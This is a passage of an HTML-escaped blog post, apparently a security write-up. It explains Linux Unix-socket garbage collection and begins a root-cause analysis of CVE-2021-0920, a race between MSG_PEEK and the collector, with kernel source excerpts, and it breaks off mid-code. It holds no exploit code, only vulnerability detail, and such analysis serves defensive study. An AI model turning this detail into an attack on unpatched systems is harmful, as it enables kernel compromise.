class=\"ykcrMYlEiJ-c3\"&gt;skb&lt;/span&gt;&lt;span&gt;&amp;nbsp;from the receiver queue:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.ef5f1527ea6a99948aacf9ba31c9a016e0a52e01\"&gt;&lt;/a&gt;&lt;a id=\"t.12\"&gt;&lt;/a&gt;&lt;table class=\"ykcrMYlEiJ-c33\"&gt;&lt;tr class=\"ykcrMYlEiJ-c17\"&gt;&lt;td class=\"ykcrMYlEiJ-c18\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c23\"&gt;/**&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c23\"&gt;&amp;nbsp;* &amp;nbsp; &amp;nbsp; &amp;nbsp;__skb_queue_purge - empty a list&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c23\"&gt;&amp;nbsp;* &amp;nbsp; &amp;nbsp; &amp;nbsp;@list: list to empty&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c23\"&gt;&amp;nbsp;*&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c23\"&gt;&amp;nbsp;* &amp;nbsp; &amp;nbsp; &amp;nbsp;Delete all buffers on an &amp;amp;sk_buff list. Each buffer is removed from&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c23\"&gt;&amp;nbsp;* &amp;nbsp; &amp;nbsp; &amp;nbsp;the list and one reference dropped. This function does not take the&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c23\"&gt;&amp;nbsp;* &amp;nbsp; &amp;nbsp; &amp;nbsp;list lock and the caller must hold the relevant locks to use it.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c23\"&gt;&amp;nbsp;*/&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;void&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;skb_queue_purge&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;struct&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;sk_buff_head &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;*&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;list&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;static&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;inline&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;void&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;__skb_queue_purge&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;struct&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;sk_buff_head &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;*&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;list&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;struct&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;sk_buff &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;*&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;skb&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;while&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;((&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;skb &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;=&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;__skb_dequeue&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;list&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;))&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;!=&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;NULL&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; kfree_skb&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;skb&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;There are two ways to trigger the garbage collection process:&lt;/span&gt;&lt;/p&gt;&lt;ol class=\"c27 lst-kix_58ja23nrczhl-0 start\" start=\"1\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c12 c20 c25 li-bullet-0\"&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;wait_for_unix_gc&lt;/span&gt;&lt;span&gt;&amp;nbsp;is invoked at the beginning of the &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;sendmsg&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&amp;nbsp;function if there are more than 16,000 inflight sockets&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c12 c20 c25 li-bullet-0\"&gt;&lt;span&gt;When a &lt;/span&gt;&lt;span&gt;socket file&lt;/span&gt;&lt;span&gt;&amp;nbsp;is released by the kernel (i.e., a file descriptor is closed), the kernel will directly invoke &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;unix_gc&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;.&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span&gt;Note that &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;unix_gc&lt;/span&gt;&lt;span&gt;&amp;nbsp;is not preemptive. If garbage collection is already in process, the kernel will not perform another &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;unix_gc&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&amp;nbsp;invocation.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span&gt;Now, let&amp;rsquo;s check this example (a breakable cycle) with a pair of sockets &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8 ykcrMYlEiJ-c40\"&gt;0&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8 ykcrMYlEiJ-c40\"&gt;1&lt;/span&gt;&lt;span&gt;,&lt;/span&gt;&lt;span&gt;&amp;nbsp;and a single socket &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;&amp;#x1d6fc;&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;/p&gt;&lt;ol class=\"c27 lst-kix_51hgl6mwb3et-0 start\" start=\"1\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c12 c20 c25 li-bullet-0\"&gt;&lt;span&gt;Socket &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f&amp;#8239;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span&gt;&amp;nbsp;sends socket &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f&amp;#8239;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8 ykcrMYlEiJ-c40\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;to socket &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f&amp;#8239;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c12 c20 c25 li-bullet-0\"&gt;&lt;span&gt;Socket &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f&amp;#8239;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span&gt;&amp;nbsp;sends socket &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f&amp;#8239;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span&gt;&amp;nbsp;to socket &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;&amp;#x1d6fc;&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c12 c20 c25 li-bullet-0\"&gt;&lt;span&gt;Close &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f&amp;#8239;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c12 c20 c25 li-bullet-0\"&gt;&lt;span&gt;Close &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f&amp;#8239;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;Before starting the garbage collection process, the status of socket file descriptors are:&lt;/span&gt;&lt;/p&gt;&lt;ul style=\"padding: 0;\" class=\"c27 lst-kix_yzib59bcdnhj-0 start\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c12 c20 c25 li-bullet-0\"&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f&amp;#8239;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;: ref = 1, inflight = 1&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c12 c20 c25 li-bullet-0\"&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f&amp;#8239;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;: ref = 1, inflight = 1&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c12 c20 c25 li-bullet-0\"&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;&amp;#x1d6fc;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;: ref = 1, inflight = 0&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhfD3EkqhRCP3nucxrm7-5h2T0Z0Q9e2xWhLX_CA07nU5IWXOAejwDvqPBd2CeJVLrM5bg502cpkm2noANVBV24QVmHRGA3IkHF_at3u6i2rYCHZH4wpvS5EfIC6ibJgtZb4LSO2IjdNbqw_PawxHzGAI9LtmhXRO5rv8SDTHa5mwncMXptSJmjnBZx/s834/image69.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhfD3EkqhRCP3nucxrm7-5h2T0Z0Q9e2xWhLX_CA07nU5IWXOAejwDvqPBd2CeJVLrM5bg502cpkm2noANVBV24QVmHRGA3IkHF_at3u6i2rYCHZH4wpvS5EfIC6ibJgtZb4LSO2IjdNbqw_PawxHzGAI9LtmhXRO5rv8SDTHa5mwncMXptSJmjnBZx/s834/image69.png\" border=\"0\" alt=\"f00, f01 and alpha form a breakable cycle.\" style=\"max-height: 750px; max-width: 600px;\"title=\"f00, f01 and alpha form a breakable cycle.\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c31 ykcrMYlEiJ-c20\"&gt;&lt;span class=\"ykcrMYlEiJ-c32\"&gt;Breakable cycle by &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c32\"&gt;, &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c32\"&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;&amp;#x1d6fc;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span&gt;During the garbage collection process, &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8 ykcrMYlEiJ-c40\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;and &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8 ykcrMYlEiJ-c40\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;are considered garbage candidates. The inflight count of &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span&gt;&amp;nbsp;is dropped to zero, but the count of &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span&gt;&amp;nbsp;is still 1 because &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;&amp;#x1d6fc;&lt;/span&gt;&lt;span&gt;&amp;nbsp;is not a candidate. Thus, the kernel will restore the inflight count from &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span&gt;&amp;rsquo;s&lt;/span&gt;&lt;span&gt;&amp;nbsp;receive queue. As a result, &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span&gt;&amp;nbsp;are not treated as garbage anymore.&lt;/span&gt;&lt;/p&gt;&lt;h1 class=\"ykcrMYlEiJ-c30 ykcrMYlEiJ-c20\" id=\"h.rjtckjrq5zqp\"&gt;&lt;span class=\"ykcrMYlEiJ-c47 ykcrMYlEiJ-c39\"&gt;CVE-2021-0920 &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c39 ykcrMYlEiJ-c47\"&gt;Root Cause Analysis&lt;/span&gt;&lt;/h1&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span&gt;When&lt;/span&gt;&lt;span&gt;&amp;nbsp;a user receives &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;SCM_RIGHTS&lt;/span&gt;&lt;span&gt;&amp;nbsp;message from &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;recvmsg&lt;/span&gt;&lt;span&gt;&amp;nbsp;without the &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;MSG_PEEK&lt;/span&gt;&lt;span&gt;&amp;nbsp;flag, the kernel will wait until the garbage collection process finishes if it is in progress. However, if the &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;MSG_PEEK&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&amp;nbsp;flag is on, the kernel will increment the reference count of the transmitted file structures without synchronizing with any ongoing garbage collection process. This may lead to inconsistency of the internal garbage collection state, making the garbage collector mark a non-garbage sock object as garbage to purge.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"ykcrMYlEiJ-c20 ykcrMYlEiJ-c30\" id=\"h.7lz5lcv6k4oi\"&gt;&lt;span&gt;r&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c1\"&gt;ecvmsg without MSG_PEEK flag&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span&gt;The kernel function&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;unix_stream_read_generic&lt;/span&gt;&lt;span&gt;&amp;nbsp;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c9\"&gt;&lt;a class=\"ykcrMYlEiJ-c261\" href=\"https://elixir.bootlin.com/linux/v4.14.277/source/net/unix/af_unix.c#L2290\"&gt;af_unix.c#L2290&lt;/a&gt;&lt;/span&gt;&lt;span&gt;) parses the &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;SCM_RIGHTS&lt;/span&gt;&lt;span&gt;&amp;nbsp;message and manages the file inflight count when the &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;MSG_PEEK&lt;/span&gt;&lt;span&gt;&amp;nbsp;flag is &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c39\"&gt;NOT&lt;/span&gt;&lt;span&gt;&amp;nbsp;set. Then, the function &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;unix_stream_read_generic&lt;/span&gt;&lt;span&gt;&amp;nbsp;calls &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;unix_detach_fds&lt;/span&gt;&lt;span&gt;&amp;nbsp;to decrement the inflight count. Then, &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;unix_detach_fds&lt;/span&gt;&lt;span&gt;&amp;nbsp;clears the list of passed file descriptors (&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;scm_fp_list&lt;/span&gt;&lt;span&gt;) from the &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;skb&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.0251da5f97c6a33bfc5ce0e11f69ded3f816103b\"&gt;&lt;/a&gt;&lt;a id=\"t.13\"&gt;&lt;/a&gt;&lt;table class=\"ykcrMYlEiJ-c33\"&gt;&lt;tr class=\"ykcrMYlEiJ-c17\"&gt;&lt;td class=\"ykcrMYlEiJ-c18\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;static&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;void&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;unix_detach_fds&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;struct&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;scm_cookie &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;*&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;scm&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;,&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;struct&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;sk_buff &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;*&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;skb&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;int&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;i&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c29\"&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c13\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; scm&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;fp &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;=&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;UNIXCB&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;skb&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;).&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;fp&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;UNIXCB&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;skb&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;).&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;fp &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;=&lt;/span&gt;&lt;span 